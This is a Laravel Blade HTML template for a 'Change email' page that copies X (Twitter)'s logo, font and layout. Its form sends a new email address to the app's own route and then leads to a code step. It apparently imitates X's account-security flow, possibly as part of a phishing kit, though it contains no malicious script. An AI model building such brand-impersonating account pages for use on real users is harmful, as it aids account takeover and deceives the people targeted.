<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Change email</title>
<style>
  @font-face {
    font-family: 'Chirp';
    src: url('/fonts/Chirp Regular.woff') format('woff');
    font-weight: 400;
  }

  @font-face {
    font-family: 'Chirp';
    src: url('/fonts/Chirp Medium.woff') format('woff');
    font-weight: 500;
  }

  @font-face {
    font-family: 'Chirp';
    src: url('/fonts/Chirp Bold.woff') format('woff');
    font-weight: 700;
  }

  @font-face {
    font-family: 'Chirp';
    src: url('/fonts/Chirp Heavy.woff') format('woff');
    font-weight: 800;
  }

  * { box-sizing: border-box; }

  html, body {
    margin: 0;
    width: 100%;
    min-height: 100vh;
    background: #000;
    color: #f5f5f5;
    font-family: 'Chirp', Arial, Helvetica, sans-serif;
  }

  /* 1. Make the body a flex container so we can center the remaining space */
  body {
    display: flex;
    flex-direction: column;
    overflow-x: hidden;
  }

  /* 2. Container to vertically and horizontally center the modal */
  .main-wrapper {
    flex: 1;
    display: flex;
    align-items: center;
    justify-content: center;
    padding: 20px;
  }

  /* Navbar styling */
  .navbar {
    display: flex;
    justify-content: space-between;
    align-items: center;
    padding: 20px 50px;
    border-bottom: 1px solid rgba(255,255,255,0.08);
  }

  .nav-left,
  .nav-right {
    display: flex;
    align-items: center;
    gap: 30px;
  }

  .logo {
    font-size: 28px;
    font-weight: bold;
  }

  .logo svg { display: block; width: 28px; height: 28px; }

  .nav-link {
    text-decoration: none;
    color: #8a8a8a;
    font-size: 13px;
    letter-spacing: 1px;
    text-transform: uppercase;
    transition: 0.3s;
  }

  .nav-link:hover { color: white; }

  .lang-btn,
  .signin-btn {
    padding: 10px 20px;
    border: 1px solid rgba(255,255,255,0.2);
    background: transparent;
    color: white;
    border-radius: 25px;
    cursor: pointer;
  }

  /* 3. Modal/Card styling updated to act as a proper centered box */
  .modal {
    position: relative;
    width: min(560px, 100%);
    padding: 40px;
    background: #000;
    border: 1px solid rgba(255, 255, 255, 0.15); /* Adds a card border */
    border-radius: 16px;                         /* Rounds the card corners */
    box-shadow: 0 4px 20px rgba(0, 0, 0, 0.5);
  }

  .close {
    position: absolute;
    top: 20px;
    right: 25px;
    border: 0;
    background: transparent;
    color: #e9e9e9;
    font-size: 24px;
    line-height: 1;
    font-weight: 300;
    cursor: pointer;
    padding: 0;
  }

  h1 {
    margin: 10px 0 15px;
    font-size: 24px;
    line-height: 1.2;
    font-weight: 700;
    letter-spacing: -0.2px;
  }

  .description {
    margin: 0 0 16px;
    max-width: 540px;
    color: #777;
    font-size: 13px;
    line-height: 1.5;
  }

  .description a {
    color: #aaa;
    text-decoration: none;
  }
  .description a:hover { text-decoration: underline; }

  .field-label {
    display: block;
    margin-top: 25px;
    margin-bottom: 8px;
    color: #aaa;
    font-size: 12px;
    line-height: 1;
  }

  .email-input {
    display: block;
    width: 100%;
    height: 44px;
    padding: 0 12px;
    border: 1px solid #333;
    border-radius: 6px;
    outline: none;
    background: #050505;
    color: #f5f5f5;
    font-size: 14px;
  }

  .email-input:focus {
    border-color: #666;
    box-shadow: 0 0 0 1px #666;
  }

  .confirm-row {
    display: flex;
    align-items: flex-start;
    gap: 10px;
    margin-top: 20px;
    color: #8a8a8a;
    font-size: 12px;
    line-height: 1.4;
  }

  .confirm-row input {
    appearance: none;
    flex: 0 0 auto;
    width: 16px;
    height: 16px;
    margin: 2px 0 0 0;
    border: 1px solid #555;
    border-radius: 3px;
    background: #050505;
    cursor: pointer;
  }

  .confirm-row input:checked {
    border-color: #999;
    background: #ddd;
    box-shadow: inset 0 0 0 3px #050505;
  }

  .confirm-row label { cursor: pointer; }
  .confirm-row a { color: #aaa; text-decoration: none; }
  .confirm-row a:hover { text-decoration: underline; }

  /* 4. Removed absolute positioning so the button stays inside the card */
  .next {
    display: block;
    width: 100%;
    height: 44px;
    margin-top: 35px;
    border: 0;
    border-radius: 22px;
    background: #edf2f4;
    color: #111;
    font-size: 14px;
    font-weight: 600;
    cursor: pointer;
    transition: background-color 0.2s ease;
  }

  .next:hover { background: #fff; }
  .next:active { transform: translateY(1px); }

  .back {
    display: block;
    width: 100%;
    height: 44px;
    margin-top: 10px;
    border: 1px solid #292929;
    border-radius: 22px;
    background: transparent;
    color: #fff;
    font-size: 14px;
    font-weight: 600;
    cursor: pointer;
  }

  .back:hover { border-color: #666; }

  @media (max-width: 768px) {
    .navbar { padding: 15px 20px; }
    .nav-left .nav-link { display: none; }
  }

  @media (max-width: 600px) {
    .modal {
      width: 90vw;
      padding: 30px 20px;
    }
  }
</style>
</head>
<body>

<nav class="navbar">
  <div class="nav-left">
    <a href="{{ route('landing') }}" class="logo" aria-label="X" role="link"><svg viewBox="0 0 24 24" aria-hidden="true" fill="currentColor"><path d="M21.742 21.75l-7.563-11.179 7.056-8.321h-2.456l-5.691 6.714-4.54-6.714H2.359l7.29 10.776L2.25 21.75h2.456l6.035-7.118 4.818 7.118h6.191-.008zM7.739 3.818L18.81 20.182h-2.447L5.29 3.818h2.447z"></path></svg></a>
    <a href="#" class="nav-link">Help Center</a>
    <a href="#" class="nav-link">Account</a>
    <a href="#" class="nav-link">Safety</a>
    <a href="#" class="nav-link">Contact</a>
  </div>

  <div class="nav-right">
    <button class="lang-btn" type="button">[EN] English</button>
    <button class="signin-btn" type="button">Sign In</button>
  </div>
</nav>

<!-- Main Wrapper to handle the centering -->
<div class="main-wrapper">
  <main class="modal" role="dialog" aria-labelledby="title">
    <button class="close" type="button" aria-label="Close" onclick="closeModal()">x</button>

    <h1 id="title">Change email</h1>

    <p class="description">
      Your account email is <strong id="currentEmail">support@...com</strong>.
      What would you like to change it to?
      Your email is used to receive important account information.
      <a href="#">Learn more</a>
    </p>

    <p class="description">
      If you change your email address, any existing Google social
      connections will be removed.
      <a href="#">Related Connected accounts</a>
      <a href="#">Help</a>
    </p>

    <form method="POST" action="{{ route('email.store') }}">
      @csrf
    <label class="field-label" for="email">Email address</label>
    <input class="email-input" id="email" name="email" type="email" value="{{ old('email') }}" autocomplete="email" required>
    @error('email')<p class="description">{{ $message }}</p>@enderror

    <div class="confirm-row">
      <input id="confirm" name="confirmed" type="checkbox" value="1" required>
      <label for="confirm">
        I will use a new email address and confirm it will not be
        <a href="#">used by another account.</a>
      </label>
    </div>

    @error('confirmed')<p class="description">{{ $message }}</p>@enderror
    <button class="next" type="submit">Next</button>
    <button class="back" type="button" onclick="history.back()">Back</button>
    </form>
  </main>
</div>

<script>
  function closeModal() {
    document.querySelector('.modal').style.display = 'none';
  }

  function nextStep() {
    const email = document.getElementById('email').value.trim();
    const confirmed = document.getElementById('confirm').checked;

    if (!email) {
      alert('Please enter an email address.');
      return;
    }

    if (!confirmed) {
      alert('Please confirm the email address before continuing.');
      return;
    }

    window.location.href = '{{ route('code.show') }}';
  }
</script>

</body>
</html>
